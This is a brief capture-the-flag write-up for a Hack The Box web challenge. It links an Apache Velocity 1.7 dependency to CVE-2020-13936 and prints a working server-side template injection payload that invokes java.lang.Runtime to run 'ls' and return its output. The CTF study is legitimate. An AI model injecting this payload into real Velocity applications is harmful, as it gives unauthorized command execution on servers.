
2024-12-21 00:09

Source: #htb #web 

in the challenge description we find a `pom.xml`, This is an XML file containing a list of dependencies, plugins, etc. that the server uses.

I find out that the last dependency on this list — Apache Velocity Engine 1.7 — is affected by [CVE-2020–13936](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13936). This makes the web application vulnerable to **server side template injection** [[Server-side template injection (SSTI)]].

Since we are dealing with an Apache web server. By default, you can view web configurations in the `/etc/apache2/sites-enabled/000-default.conf`

Now, we need to include a payload in the text that will give us our flag. We’ll read up a bit on Velocity 1.7 first — here is the official documentation — [https://velocity.apache.org/engine/1.7/user-guide.html](https://velocity.apache.org/engine/1.7/user-guide.html).

Now, I’ll include a payload which I found [here](https://gosecure.github.io/template-injection-workshop/#6).

```js
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##

#set($ex=$rt.getRuntime().exec('ls'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```
url encode the payload 


### References
https://medium.com/@rahulhoysala07/hack-the-box-web-challenge-labyrinth-linguist-a67d5005abe0